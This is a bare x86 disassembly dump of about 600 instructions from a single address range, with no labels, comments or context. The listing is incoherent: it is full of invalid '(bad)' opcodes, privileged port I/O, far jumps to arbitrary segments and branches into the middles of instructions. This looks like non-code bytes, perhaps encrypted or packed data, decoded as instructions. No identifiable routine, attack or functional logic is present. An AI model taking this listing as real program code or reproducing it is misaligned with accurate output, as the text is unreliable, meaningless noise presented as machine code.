  416b4b:	retf   0xfffe
  416b4e:	pop    ds
  416b4f:	int3   
  416b50:	jmp    0xf59273f2
  416b55:	xchg   ebp,eax
  416b56:	pop    ss
  416b57:	ror    DWORD PTR [eax-0x5b54b934],0x68
  416b5e:	pop    ds
  416b5f:	outs   dx,BYTE PTR ds:[esi]
  416b60:	push   ebp
  416b61:	fldenv [ecx-0x5e]
  416b64:	call   0xa6bc:0xcbbefc53
  416b6b:	sbb    esi,DWORD PTR [esi]
  416b6d:	mov    dl,0x3f
  416b6f:	and    BYTE PTR [edx],al
  416b71:	xchg   ebp,eax
  416b72:	imul   ebx,DWORD PTR [ebx+0x480b907e],0x1951a8e5
  416b7c:	sti    
  416b7d:	or     ebx,DWORD PTR [esi]
  416b7f:	lods   eax,DWORD PTR ds:[esi]
  416b80:	mov    ah,0x40
  416b82:	les    ebp,FWORD PTR [eax]
  416b84:	jae    0x416ba2
  416b86:	xor    eax,0xc81713b4
  416b8b:	add    eax,0x40d6aaeb
  416b90:	mov    bl,BYTE PTR [edx]
  416b92:	or     esi,DWORD PTR [edi+0x1ee743e0]
  416b98:	adc    eax,DWORD PTR [esi]
  416b9a:	fmul   st,st(6)
  416b9c:	sub    ebx,DWORD PTR [edx-0x4c]
  416b9f:	sti    
  416ba0:	and    BYTE PTR [edi-0x52],al
  416ba3:	pusha  
  416ba4:	xor    BYTE PTR [edi-0x75],0x42
  416ba8:	mov    dh,0x7d
  416baa:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  416bac:	push   esi
  416bad:	push   eax
  416bae:	fistp  QWORD PTR [ebx-0x1c]
  416bb1:	xchg   ebp,eax
  416bb2:	jb     0x416bb9
  416bb4:	jmp    0xf1051b59
  416bb9:	jg     0x416c24
  416bbb:	mov    ecx,0x99fb035e
  416bc0:	cs pop ecx
  416bc2:	in     eax,dx
  416bc3:	jno    0x416bb7
  416bc5:	xchg   esi,eax
  416bc6:	adc    eax,0x9c123b5d
  416bcb:	pop    es
  416bcc:	sar    BYTE PTR [edi+esi*4+0x45],0x98
  416bd1:	push   0x5
  416bd3:	out    dx,eax
  416bd4:	xor    bl,BYTE PTR [ebp+ebx*4+0x15]
  416bd8:	mov    al,0x5e
  416bda:	fdiv   st,st(1)
  416bdc:	(bad)  
  416bde:	nop
  416bdf:	imul   edx,DWORD PTR [ebx-0xf02c35d],0x78
  416be6:	xchg   esi,eax
  416be7:	mov    ecx,0xacdd1eba
  416bec:	retf   
  416bed:	aad    0x1f
  416bef:	xor    esp,edi
  416bf1:	cmp    BYTE PTR [edx],0xc2
  416bf4:	push   ss
  416bf5:	std    
  416bf6:	sbb    edi,DWORD PTR [ebx]
  416bf8:	addr16 mov eax,0x9e7e9221
  416bfe:	adc    BYTE PTR [edx+edi*2+0x601c8364],ch
  416c05:	sub    al,0x1
  416c07:	mov    ebp,0xfc3784a6
  416c0c:	and    al,0x8b
  416c0e:	lock xor al,0x43
  416c11:	mov    bl,bl
  416c13:	cmp    al,0x39
  416c15:	mov    dh,0x1
  416c17:	(bad)  [edx-0xf]
  416c1a:	sar    BYTE PTR [eax-0xb],0xe1
  416c1e:	inc    eax
  416c1f:	jnp    0x416ba6
  416c21:	pop    ebx
  416c22:	push   ebx
  416c23:	xchg   ebp,eax
  416c24:	or     edx,DWORD PTR ss:[esi+0x75]
  416c28:	ror    BYTE PTR [esi+0x42],1
  416c2b:	leave  
  416c2c:	mov    ecx,0xd409b92d
  416c31:	neg    BYTE PTR [ebp+edx*8+0x4812cc4]
  416c38:	inc    esi
  416c39:	stc    
  416c3a:	icebp  
  416c3b:	sar    DWORD PTR [ecx],0x22
  416c3e:	sub    BYTE PTR [ecx+0x15b38b79],bh
  416c44:	cld    
  416c45:	sub    esp,ebp
  416c47:	push   cs
  416c48:	dec    ebp
  416c49:	repnz cld 
  416c4b:	mov    al,0x45
  416c4d:	das    
  416c4e:	fild   WORD PTR [edx]
  416c50:	xchg   ebp,eax
  416c51:	mov    WORD PTR [edi+eiz*1-0x5b33330b],es
  416c58:	call   0xf64c512
  416c5d:	in     al,dx
  416c5e:	mov    WORD PTR ds:0x75902e2c,fs
  416c64:	sub    BYTE PTR ds:0x6e44f2aa,bh
  416c6a:	jecxz  0x416c86
  416c6c:	jp     0x416c8a
  416c6e:	mov    al,ds:0xc95a3e22
  416c73:	sub    DWORD PTR [edi-0x969040],ebp
  416c79:	movaps xmm3,XMMWORD PTR [ebp-0x66f0dd50]
  416c80:	pop    es
  416c81:	cmp    ecx,esp
  416c83:	ss leave 
  416c85:	mov    ebp,esp
  416c87:	outs   dx,BYTE PTR ds:[esi]
  416c88:	out    dx,al
  416c89:	sbb    al,0xa6
  416c8b:	and    eax,0xdce0f695
  416c90:	in     al,dx
  416c91:	pop    es
  416c92:	xchg   esp,eax
  416c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c94:	inc    ebx
  416c95:	call   0x2dce7bff
  416c9a:	mov    ah,0x9b
  416c9c:	sahf   
  416c9d:	nop
  416c9e:	jne    0x416cc7
  416ca0:	(bad)  
  416ca2:	ds arpl bx,bp
  416ca5:	loope  0x416cb0
  416ca7:	sub    BYTE PTR [ecx+ebx*8],dl
  416caa:	leave  
  416cab:	sub    bl,BYTE PTR [ebp+0x3d30f151]
  416cb1:	das    
  416cb2:	repz in eax,dx
  416cb4:	and    al,0x77
  416cb6:	jb     0x416cef
  416cb8:	xor    ebx,0xffffff98
  416cbb:	mov    al,ds:0xfddc2d95
  416cc0:	fisubr WORD PTR [esi+0x33]
  416cc3:	ja     0x416d2b
  416cc5:	add    esp,DWORD PTR [ecx+0x74d72b0f]
  416ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ccc:	adc    eax,0x97bdf9a5
  416cd1:	lahf   
  416cd2:	xor    eax,0x59b3727f
  416cd7:	mov    esp,0xa1ef22b0
  416cdc:	jp     0x416c77
  416cde:	sbb    eax,0xfddc6be2
  416ce3:	lock inc eax
  416ce5:	or     BYTE PTR [ebp-0x2],dl
  416ce8:	xchg   esp,eax
  416ce9:	mov    bh,0x87
  416ceb:	aad    0x1a
  416ced:	fs in  eax,dx
  416cef:	shld   DWORD PTR [esi+0x128d6d45],edi,0x5a
  416cf7:	pop    ecx
  416cf8:	or     DWORD PTR [esi-0x6745cd45],edi
  416cfe:	mov    edi,0x1dc253d8
  416d03:	or     DWORD PTR [ecx+eiz*4-0x41beae5b],ebp
  416d0a:	nop
  416d0b:	mov    ecx,0xf71742d8
  416d10:	add    ebx,esi
  416d12:	in     eax,0xc9
  416d14:	pop    ebp
  416d15:	and    eax,0xd9150fdb
  416d1a:	ror    DWORD PTR [edx+ebp*1+0x77],1
  416d1e:	adc    BYTE PTR [ebx+0x33],0x68
  416d22:	or     BYTE PTR [ebp-0x11b77cc7],bl
  416d28:	imul   ebx,DWORD PTR [ebx],0xffffff87
  416d2b:	test   al,0xcf
  416d2d:	dec    esp
  416d2e:	or     BYTE PTR [edi+0x3c],cl
  416d31:	call   0x36d39b11
  416d36:	push   ebx
  416d37:	pop    eax
  416d38:	(bad)  
  416d39:	cmp    eax,0x7a119044
  416d3e:	(bad)  
  416d3f:	repz and al,0x93
  416d42:	xor    al,0x6e
  416d44:	frstor [ebx-0x1c]
  416d47:	pusha  
  416d48:	scas   eax,DWORD PTR es:[edi]
  416d49:	cwde   
  416d4a:	inc    DWORD PTR [ebp+0x7fb00792]
  416d50:	rcl    al,cl
  416d52:	add    al,BYTE PTR [edx+0x3]
  416d55:	and    BYTE PTR [ebx+0xb632a82],cl
  416d5b:	(bad)  
  416d5c:	jmp    0xaaf6:0x7da6ffe4
  416d63:	cmp    eax,0xfa048313
  416d68:	scas   eax,DWORD PTR es:[edi]
  416d69:	shr    BYTE PTR [esi+0x19],cl
  416d6c:	mov    esp,0x94409801
  416d71:	xchg   esp,eax
  416d72:	push   ss
  416d73:	into   
  416d74:	adc    ecx,DWORD PTR [ebp-0x6f]
  416d77:	jle    0x416dae
  416d79:	enter  0x290b,0x9b
  416d7d:	push   eax
  416d7e:	mov    al,0x9e
  416d80:	(bad)  
  416d81:	xchg   edi,eax
  416d82:	sub    al,0xe5
  416d84:	test   eax,0x4ca68ff2
  416d89:	cmp    eax,0x6356a5a7
  416d8e:	push   ebp
  416d8f:	pop    ecx
  416d90:	mov    eax,ds:0xd0abdaa0
  416d95:	stos   DWORD PTR es:[edi],eax
  416d96:	jp     0x416e02
  416d98:	push   ecx
  416d99:	or     al,0x4c
  416d9b:	jp     0x416d49
  416d9d:	neg    esi
  416d9f:	jp     0x416e04
  416da1:	sbb    BYTE PTR [ebx-0x17e6ea74],0x1d
  416da8:	and    esi,eax
  416daa:	mov    ds:0x6c889d39,eax
  416daf:	loope  0x416d6c
  416db1:	dec    ebp
  416db2:	cwde   
  416db3:	adc    BYTE PTR [edx],bh
  416db5:	adc    eax,0x7a0c306
  416dba:	pushf  
  416dbb:	cmp    ah,al
  416dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dbe:	repz test eax,0x683596bb
  416dc4:	xor    eax,0x820e15bb
  416dc9:	test   eax,0xc2eaa76b
  416dce:	mov    al,ds:0xbd616ed
  416dd3:	or     al,0xf7
  416dd5:	inc    edx
  416dd6:	scas   al,BYTE PTR es:[edi]
  416dd7:	adc    BYTE PTR [ebx+esi*1-0x2509c45],bh
  416dde:	jp     0x416dc7
  416de0:	adc    DWORD PTR [edx-0xc],esi
  416de3:	and    BYTE PTR [edi-0x2d],bh
  416de6:	mov    esp,0xa046b0ac
  416deb:	and    edx,DWORD PTR [eax+eax*1-0x3f9dec5e]
  416df2:	test   BYTE PTR [esi],al
  416df4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416df5:	(bad)  
  416df7:	push   ecx
  416df8:	xor    edx,DWORD PTR [ebp+eax*4+0xcc7134e]
  416dff:	cmp    BYTE PTR [esi-0x57],0xf4
  416e03:	enter  0x7f2f,0xc
  416e07:	out    dx,eax
  416e08:	add    bh,BYTE PTR [esi+0x59]
  416e0b:	fcmovnbe st,st(3)
  416e0d:	ja     0x416dec
  416e0f:	gs popa 
  416e11:	outs   dx,DWORD PTR ds:[esi]
  416e12:	mov    ds:0x60eab12f,al
  416e18:	xchg   esi,eax
  416e19:	sub    al,BYTE PTR [ebx+eax*1-0x30]
  416e1d:	or     al,0x65
  416e1f:	mov    dl,0x51
  416e21:	sub    ah,ah
  416e23:	pop    esi
  416e24:	std    
  416e25:	mov    eax,ds:0xe4b841fd
  416e2a:	sub    al,0x94
  416e2c:	mov    bh,0xdd
  416e2e:	mov    dh,0x73
  416e30:	jae    0x416eae
  416e32:	les    edi,FWORD PTR [esi+0x14]
  416e35:	in     al,dx
  416e36:	xlat   BYTE PTR ds:[ebx]
  416e37:	jo     0x416ea8
  416e39:	mov    BYTE PTR [edi+esi*4],0x46
  416e3d:	and    BYTE PTR [edi+0x17],bl
  416e40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e41:	dec    ecx
  416e42:	mov    ebp,0x43340e89
  416e47:	cmc    
  416e48:	or     bh,BYTE PTR [esi]
  416e4a:	xor    al,0x66
  416e4c:	sbb    DWORD PTR [ebx+0x4df15404],ecx
  416e52:	sub    al,0xf1
  416e54:	dec    edx
  416e55:	mov    es,WORD PTR [eax-0x1]
  416e58:	adc    edx,DWORD PTR [edx+0x488f8e2b]
  416e5e:	call   0x4fb:0xac614a77
  416e65:	lea    edx,[esi]
  416e67:	sbb    BYTE PTR [esi+0x6a],0xf5
  416e6b:	inc    edi
  416e6c:	lods   eax,DWORD PTR ds:[esi]
  416e6d:	lds    ecx,FWORD PTR [edx+0x13]
  416e70:	adc    al,0x73
  416e72:	mov    al,0x9f
  416e74:	dec    eax
  416e75:	fwait
  416e76:	add    al,0x30
  416e78:	sbb    eax,0xd7856466
  416e7d:	aam    0x34
  416e7f:	(bad)  
  416e81:	dec    eax
  416e82:	scas   eax,DWORD PTR es:[edi]
  416e83:	mov    esi,0x965bd0a2
  416e88:	sahf   
  416e89:	lock dec edi
  416e8b:	or     eax,0x312d445f
  416e90:	sahf   
  416e91:	and    ah,BYTE PTR [edx-0x47]
  416e94:	rcl    BYTE PTR [esi+ecx*8],1
  416e97:	mov    esp,0xe6d2a574
  416e9c:	mov    ds:0x1f5b44e8,eax
  416ea1:	in     eax,0x1
  416ea3:	mov    esi,0xe2f7dc19
  416ea8:	push   es
  416ea9:	pushf  
  416eaa:	xchg   DWORD PTR [ebp-0x76506557],esi
  416eb0:	mov    ds:0x968563a4,al
  416eb5:	sub    BYTE PTR [ebx+0x596b65c2],al
  416ebb:	shl    ebp,cl
  416ebd:	call   0x563b:0x1f41d1ec
  416ec4:	fwait
  416ec5:	mov    ds:0x1933a052,al
  416eca:	fucomi st,st(7)
  416ecc:	test   DWORD PTR gs:[edx],ecx
  416ecf:	adc    al,0x2f
  416ed1:	inc    eax
  416ed2:	mov    ds:0x758432ad,al
  416ed7:	xchg   edi,eax
  416ed8:	mov    WORD PTR [eax+0xe33c223],gs
  416ede:	adc    eax,0x7fbcd619
  416ee3:	pop    edx
  416ee4:	loopne 0x416eed
  416ee6:	sub    edi,DWORD PTR [ecx+0x45851cda]
  416eec:	stos   BYTE PTR es:[edi],al
  416eed:	mov    eax,ds:0x6ac63c37
  416ef2:	fisttp WORD PTR [esi+eax*4]
  416ef5:	mov    esp,0xef20047a
  416efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416efb:	xchg   BYTE PTR [edi],al
  416efd:	xor    ecx,DWORD PTR [edi-0x79]
  416f00:	cld    
  416f01:	lahf   
  416f02:	add    ah,BYTE PTR [ebx+0x3b]
  416f05:	fmulp  st(5),st
  416f07:	push   cs
  416f08:	lods   al,BYTE PTR ds:[esi]
  416f09:	fistp  QWORD PTR [edx]
  416f0b:	adc    al,BYTE PTR [edx+0x7828ceb7]
  416f11:	(bad)  
  416f12:	jne    0x416ef0
  416f14:	or     bl,BYTE PTR [esi-0x7abd78e8]
  416f1a:	les    edi,FWORD PTR [esp+edx*1]
  416f1d:	mov    cl,0xf5
  416f1f:	push   ebx
  416f20:	dec    esi
  416f21:	aad    0x83
  416f23:	mov    ds:0xa68824bf,eax
  416f28:	(bad)  [edi-0x1a]
  416f2b:	pop    ecx
  416f2c:	mov    al,0x42
  416f2e:	in     eax,0x5a
  416f30:	mov    dl,0x34
  416f32:	fwait
  416f33:	push   es
  416f34:	xchg   bl,ah
  416f36:	mov    cl,cl
  416f38:	fadd   QWORD PTR [edx+0x79d36592]
  416f3e:	ins    DWORD PTR es:[edi],dx
  416f3f:	sbb    al,0x4b
  416f41:	in     eax,0xbc
  416f43:	xor    ecx,ecx
  416f45:	pop    ecx
  416f46:	sbb    DWORD PTR [ebx+eiz*1],0xffffffe7
  416f4a:	and    bl,BYTE PTR [ecx+0xcdc6fc2]
  416f50:	in     eax,dx
  416f51:	sbb    ebx,DWORD PTR [ecx+0x19]
  416f54:	sub    DWORD PTR ds:0xa581bad2,ebp
  416f5a:	jg     0x416f5b
  416f5c:	push   eax
  416f5d:	mov    ah,0xc3
  416f5f:	adc    ecx,DWORD PTR [edx-0x66]
  416f62:	xchg   ebx,esp
  416f64:	sbb    BYTE PTR [esp+esi*1-0x59f9423d],dh
  416f6b:	xor    dh,ch
  416f6d:	adc    ah,al
  416f6f:	xchg   ecx,eax
  416f70:	mov    dl,0xaa
  416f72:	or     al,0xd4
  416f74:	xor    bl,BYTE PTR [edx-0x5e4bf19b]
  416f7a:	je     0x416f6a
  416f7c:	dec    ebp
  416f7d:	pop    edi
  416f7e:	mov    ch,0x57
  416f80:	mov    ah,0x31
  416f82:	pop    ebp
  416f83:	stos   BYTE PTR es:[edi],al
  416f84:	jns    0x416f64
  416f86:	data16 ror bh,1
  416f89:	or     eax,0x7f26493d
  416f8e:	test   eax,0x5c5a5ef1
  416f93:	ds jbe 0x416fcf
  416f96:	and    bh,bh
  416f98:	fs sbb al,0x77
  416f9b:	mov    eax,DWORD PTR ss:[esi-0x33]
  416f9f:	es adc ecx,0x7f
  416fa3:	idiv   DWORD PTR [edi-0x5bd12a25]
  416fa9:	or     BYTE PTR fs:[ebp-0x31],dl
  416fad:	or     eax,0x3f7b8e0e
  416fb2:	add    ch,BYTE PTR ds:0xd7c64c01
  416fb8:	adc    al,0x6b
  416fba:	out    0x53,eax
  416fbc:	inc    edx
  416fbd:	data16 jbe 0x416fd3
  416fc0:	xchg   ebp,eax
  416fc1:	cs ret 
  416fc3:	jl     0x416f7a
  416fc5:	and    bh,cl
  416fc7:	push   ebp
  416fc8:	inc    ecx
  416fc9:	jl     0x416f85
  416fcb:	dec    esi
  416fcc:	frstor [edx-0x93fed59]
  416fd2:	ror    ebx,0x73
  416fd5:	xchg   edi,eax
  416fd6:	jge    0x416f83
  416fd8:	gs jl  0x416fec
  416fdb:	add    ah,al
  416fdd:	lods   al,BYTE PTR ds:[esi]
  416fde:	adc    DWORD PTR [edx-0x7c8620a4],ebx
  416fe4:	adc    ah,dl
  416fe6:	and    esi,eax
  416fe8:	retf   
  416fe9:	inc    edx
  416fea:	xchg   BYTE PTR [edx+esi*2-0x20],cl
  416fee:	mov    al,0xc0
  416ff0:	fidivr WORD PTR [ebp-0x4f12990b]
  416ff6:	out    0xd4,al
  416ff8:	xchg   ecx,eax
  416ff9:	pop    ebp
  416ffa:	(bad)  
  416ffb:	adc    eax,0x3b8683d2
  417000:	or     BYTE PTR [eax],dl
  417002:	mov    edx,ecx
  417004:	call   0xa9b4e25f
  417009:	cs mov ebp,?
  41700c:	fistp  DWORD PTR [edi+0x36]
  41700f:	xchg   ebp,eax
  417010:	cmp    BYTE PTR [esi-0x2a],cl
  417013:	sub    eax,0x81a5e4b9
  417018:	or     ecx,DWORD PTR [esp+esi*8+0x35e2af7c]
  41701f:	adc    BYTE PTR [eax+0x7a],0xd9
  417023:	in     eax,0xd6
  417025:	mov    ah,0x8f
  417027:	inc    eax
  417028:	pop    ecx
  417029:	add    BYTE PTR [esi],cl
  41702b:	ret    
  41702c:	call   0xa9ac6d86
  417031:	pusha  
  417032:	sbb    al,0xbd
  417034:	or     ecx,DWORD PTR [ecx+edx*2-0x28]
  417038:	dec    edx
  417039:	xor    ebx,DWORD PTR ss:[eax-0x7f754185]
  417040:	ja     0x417037
  417042:	pop    ss
  417043:	mov    edi,0xe97b8ce4
  417048:	cmp    bl,BYTE PTR ds:0x7c2386df
  41704e:	push   esp
  41704f:	jmp    0x416fe8
  417051:	test   eax,0xcb84098
  417056:	ds and al,0x7e
  417059:	test   ah,0x93
  41705c:	and    BYTE PTR [esi],cl
  41705e:	iret   
  41705f:	dec    esi
  417060:	mov    bl,0xcb
  417062:	int    0x56
  417064:	cmp    bh,BYTE PTR [eax-0x57]
  417067:	out    dx,al
  417068:	icebp  
  417069:	mov    ds:0x1bd98a70,al
  41706e:	push   esp
  41706f:	lahf   
  417070:	and    esi,esi
  417072:	adc    eax,DWORD PTR [edi+0x29]
  417075:	jbe    0x4170ba
  417077:	xchg   ecx,eax
  417078:	jb     0x4170e1
  41707a:	sbb    ch,bl
  41707c:	retf   0x4f34
  41707f:	fist   WORD PTR ds:0xb3354445
  417085:	push   edx
  417086:	xor    ebp,DWORD PTR [edi+0x1d5acc12]
  41708c:	and    dl,dh
  41708e:	dec    esi
  41708f:	sbb    DWORD PTR [esi],0xe
  417092:	imul   ebp,DWORD PTR [ecx],0xc87064b5
  417098:	sub    BYTE PTR [eax-0x3e],dl
  41709b:	sub    eax,0x286aba94
  4170a0:	add    eax,0xdf66a439
  4170a5:	jae    0x41706d
  4170a7:	sub    DWORD PTR [esi+ebp*8-0x7c0d6b98],ebx
  4170ae:	jecxz  0x41704e
  4170b0:	dec    ebp
  4170b1:	cmp    cl,ah
  4170b3:	add    DWORD PTR ds:0x1697443c,ebp
  4170b9:	std    
  4170ba:	das    
  4170bb:	inc    edx
  4170bc:	sahf   
  4170bd:	adc    BYTE PTR [edx],dh
  4170bf:	frstor [eax-0x1c]
  4170c2:	mov    eax,0xb91ea197
  4170c7:	ss mov cl,0xf1
  4170ca:	sub    esi,DWORD PTR [ecx+0x51]
  4170cd:	push   ebx
  4170ce:	into   
  4170cf:	add    DWORD PTR [edx-0x1b],ebx
  4170d2:	(bad)  
  4170d3:	aad    0x3c
  4170d5:	inc    ebp
  4170d6:	out    0x9e,eax
  4170d8:	imul   BYTE PTR [esi+0x71]
  4170db:	mov    ah,0xca
  4170dd:	jl     0x417090
  4170df:	dec    eax
  4170e0:	pop    ds
  4170e1:	lods   al,BYTE PTR ds:[esi]
  4170e2:	mov    esi,0xacda92a0
  4170e7:	sbb    esi,DWORD PTR [ebx+0xb22d34e]
  4170ed:	push   edi
  4170ee:	pushf  
  4170ef:	mov    al,ds:0xb8fb4e19
  4170f4:	mov    ch,0xc5
  4170f6:	dec    ecx
  4170f7:	push   ds
  4170f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170f9:	and    ch,BYTE PTR [ebp-0x6f0ff9df]
  4170ff:	sub    BYTE PTR [ebp+0x23],ch
  417102:	imul   esi,DWORD PTR [edx-0x27],0x40a0bdd4
  417109:	mov    dl,0xc5
  41710b:	adc    DWORD PTR [edx],edx
  41710d:	cmp    eax,0x32dc177e
  417112:	jmp    0x178a:0xeedb3e77
  417119:	fldenv [esi+0x58c4ed9f]
  41711f:	je     0x417166
  417121:	outs   dx,DWORD PTR ds:[esi]
  417122:	mov    cl,0x87
  417124:	leave  
  417125:	(bad)  
  417126:	fwait
  417127:	jb     0x417192
  417129:	mov    al,ds:0xa072eaaf
  41712e:	cdq    
  41712f:	jg     0x41714f
  417131:	mov    ecx,0x77fc53fd
  417136:	sahf   
  417137:	xor    esp,DWORD PTR [esi+0x1e]
  41713a:	leave  
  41713b:	push   0x2e2fa94b
  417140:	retf   
  417141:	mov    ebp,0xeb45757
  417146:	pop    ebx
  417147:	jnp    0x4170e7
  417149:	or     dl,BYTE PTR [ebx-0xa38c5ad]
  41714f:	dec    edi
  417150:	lods   al,BYTE PTR ds:[esi]
  417151:	cmp    eax,0xe367f08f
  417156:	dec    ecx
  417157:	(bad)  [ebx+0x44f43614]
  41715d:	jg     0x417184
  41715f:	cmp    al,BYTE PTR [eax]
  417161:	imul   edi,ebx,0x4c
  417164:	rol    ch,0x17
  417167:	test   DWORD PTR [esp+ebp*2+0x480514ef],eax
  41716e:	popa   
  41716f:	inc    esi
  417170:	and    DWORD PTR [ecx-0x149eb932],esp
  417176:	xchg   esp,eax
  417177:	or     edi,DWORD PTR [ebx+ebx*8]
  41717a:	outs   dx,BYTE PTR ds:[esi]
  41717b:	clc    
  41717c:	jmp    0x50ff:0x889902ea
  417183:	pop    edx
  417184:	xor    ah,BYTE PTR [edi+esi*4+0xf]
  417188:	retf   
  417189:	std    
  41718a:	lods   al,BYTE PTR ds:[esi]
  41718b:	sub    bh,dh
  41718d:	jmp    0x627e:0x14cc0e7a
  417194:	mov    WORD PTR [ebp-0x10],ds
  417197:	ja     0x41718b
  417199:	idiv   DWORD PTR [eax+0x6504fcb9]
  41719f:	sahf   
  4171a0:	cwde   
  4171a1:	inc    ebx
  4171a2:	dec    esi
  4171a3:	cmp    eax,DWORD PTR [ecx+0x1d642675]
  4171a9:	or     eax,0xb9342549
  4171ae:	test   al,0x77
  4171b0:	loopne 0x417177
  4171b2:	push   0xeb19f6c7
  4171b7:	cdq    
  4171b8:	add    ecx,edi
  4171ba:	pop    edx
  4171bb:	mov    ch,ch
  4171bd:	cmc    
  4171be:	je     0x417170
  4171c0:	outs   dx,DWORD PTR ds:[esi]
  4171c1:	jecxz  0x41716c
  4171c3:	hlt    
  4171c4:	adc    al,0xd8
  4171c6:	add    edi,DWORD PTR [ebx]
  4171c8:	xlat   BYTE PTR ds:[ebx]
  4171c9:	push   es
  4171ca:	mul    DWORD PTR [edi]
  4171cc:	mov    edi,0xd374c17d
  4171d1:	cmp    ecx,ebp
  4171d3:	fwait
  4171d4:	and    eax,DWORD PTR [esi]
  4171d6:	fs push 0x11f890c2
  4171dc:	and    cl,al
  4171de:	pop    ebx
  4171df:	sbb    DWORD PTR [edx-0x4252aa84],ebp
  4171e5:	je     0x417186
  4171e7:	ret    0x7026
  4171ea:	sub    eax,0xf9b63491
  4171ef:	shl    BYTE PTR [edi+0x60],0xf6
  4171f3:	push   0x958aadca
  4171f8:	mov    esi,DWORD PTR [ecx]
  4171fa:	into   
  4171fb:	fild   WORD PTR [edx]
  4171fd:	call   0xbe59:0x612552ec
  417204:	adc    al,0xd7
  417206:	add    BYTE PTR ds:0xc8300dc5,ch
  41720c:	xchg   ecx,eax
  41720d:	jo     0x417270
  41720f:	and    al,0x5c
  417211:	rcl    DWORD PTR [edi],cl
  417213:	je     0x4171dd
  417215:	pop    edx
  417216:	xchg   edi,eax
  417217:	sub    DWORD PTR [ebx],edx
  417219:	sbb    ecx,DWORD PTR [edx+0x1c]
  41721c:	daa    
  41721d:	adc    al,0xc7
  41721f:	retf   0x628b
  417222:	dec    edx
  417223:	jae    0x41722a
  417225:	pop    esp
  417226:	jnp    0x41725b
  417228:	mov    bh,0xa2
  41722a:	fiadd  WORD PTR [ebx]
  41722c:	or     edx,0xefedcb68
  417232:	sbb    eax,DWORD PTR [ecx-0x16]
  417235:	xlat   BYTE PTR fs:[ebx]
  417237:	and    al,0xa0
  417239:	dec    eax
  41723a:	dec    esp
  41723b:	aas    
  41723c:	sub    eax,0x1f42c638
  417241:	cmp    ecx,edx
  417243:	imul   edx,DWORD PTR [esi-0x7],0xec745fbb
  41724a:	or     BYTE PTR [ebp+0x1b],cl
  41724d:	(bad)  
  41724e:	pop    ds
  41724f:	push   edi
  417250:	inc    esp
  417251:	out    0x3a,eax
  417253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417254:	and    DWORD PTR [edi],edi
  417256:	push   es
  417257:	(bad)  
  417258:	fld    TBYTE PTR [esi]
  41725a:	pop    edx
  41725b:	mov    dh,0x38
  41725d:	xor    eax,0x7050832c
  417262:	iret   
  417263:	test   DWORD PTR [ebx],0xe1080e94
  417269:	jbe    0x41721b
  41726b:	mov    ebx,0xb1ded9ce
  417270:	xor    al,0xf3
  417272:	pop    ecx
  417273:	pusha  
  417274:	or     bh,BYTE PTR [edx]
  417276:	mov    eax,0xaf8467c0
  41727b:	mov    dh,0x66
  41727d:	std    
  41727e:	push   eax
  41727f:	mov    eax,0x60279b72
  417284:	ja     0x417249
  417286:	dec    esi
  417287:	dec    ecx
  417288:	mov    esp,0xc9a3f71e
  41728d:	or     esp,ecx
  41728f:	inc    esp
  417290:	push   edi
  417291:	mov    dl,0xd
  417293:	push   0xf6cadb00
  417298:	inc    eax
  417299:	rcl    BYTE PTR [esi-0x9ee2548],0x21
  4172a0:	xlat   BYTE PTR ds:[ebx]
  4172a1:	test   DWORD PTR [ebx+0x7b],esi
  4172a4:	cmp    eax,0xea96f229
  4172a9:	mov    bl,0x28
  4172ab:	jb     0x417292
  4172ad:	inc    ebp
  4172ae:	inc    ecx
  4172af:	xor    BYTE PTR [ecx-0x29f2d37f],ah
  4172b5:	cmp    al,BYTE PTR [esi+ebp*4+0x4b]
  4172b9:	xlat   BYTE PTR gs:[ebx]
  4172bb:	je     0x4172d7
  4172bd:	(bad)  
  4172be:	and    al,0x39
  4172c0:	pop    ebp
  4172c1:	test   al,0x57
  4172c3:	cs pop es
  4172c5:	test   al,0x7f
  4172c7:	es mov bh,0x6c
  4172ca:	xor    DWORD PTR [ebp-0x4156e1ca],0xffffffc5
  4172d1:	xor    dh,bl
  4172d3:	adc    cl,BYTE PTR [edx+eax*1-0x2]
  4172d7:	cmp    eax,0x23711236
  4172dc:	in     eax,dx
  4172dd:	pop    edx
  4172de:	push   edi
  4172df:	aas    
  4172e0:	adc    eax,0x5e746711
  4172e5:	inc    ecx
  4172e6:	adc    eax,0xb1083f27
  4172eb:	(bad)  
  4172ec:	scas   al,BYTE PTR es:[edi]
  4172ed:	jg     0x4172a8
  4172ef:	mov    ch,0x34
  4172f1:	cld    
  4172f2:	scas   eax,DWORD PTR es:[edi]
  4172f3:	xor    BYTE PTR [esi+ebx*8+0x4],0x62
  4172f8:	mov    ebx,0x8880db44
  4172fd:	repz dec edx
  4172ff:	xchg   esi,eax
  417300:	push   esi
  417301:	call   0x3332:0x355e6284
  417308:	ret    
  417309:	add    al,0xbe
  41730b:	aaa    
  41730c:	test   eax,0x74775be5
  417311:	inc    edx
  417312:	std    
  417313:	ror    DWORD PTR [ebx-0x9],cl
  417316:	sbb    BYTE PTR fs:[ecx],dh
  417319:	jge    0x41733e
  41731b:	mov    ss,ecx
  41731d:	fidiv  WORD PTR ds:0xaf61e57c
  417323:	mov    edx,0xba07170
  417328:	(bad)  
  417329:	pop    edi
  41732a:	pop    ds
  41732b:	adc    esi,DWORD PTR [eax+0x2]
  41732e:	pop    ds
  41732f:	adc    DWORD PTR [ecx],eax
  417331:	mov    BYTE PTR [edi+0x3283d007],cl
  417337:	imul   DWORD PTR [eax+0x70]
  41733a:	shl    DWORD PTR [esi-0x4d],1
  41733d:	je     0x417321
  41733f:	out    dx,al
  417340:	or     al,0x79
  417342:	jne    0x417374
  417344:	jns    0x4172e4
  417346:	jle    0x4172ec
  417348:	pop    ebp
  417349:	dec    eax
  41734a:	call   ebp
  41734c:	(bad)  
  41734d:	sti    
  41734e:	popa   
  41734f:	sbb    esp,DWORD PTR [eax]
  417351:	adc    DWORD PTR [esi],0x48
  417354:	pop    edi
  417355:	rol    dl,0xe9
  417358:	mov    bl,0xff
  41735a:	pop    ecx
  41735b:	(bad)  
  41735c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
